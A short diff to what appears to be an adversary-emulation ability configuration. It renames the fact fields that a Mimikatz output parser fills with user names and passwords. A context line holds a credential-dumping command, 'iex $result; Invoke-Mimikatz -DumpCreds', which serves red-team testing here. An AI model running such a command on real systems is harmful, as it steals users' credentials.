@@ -17,6 +17,6 @@
           iex $result; Invoke-Mimikatz -DumpCreds
         parsers:
           plugins.stockpile.app.parsers.katz:
-            - source: host.user.name
+            - source: comp.user.name
               edge: has_password
-              target: host.user.password
+              target: comp.user.password
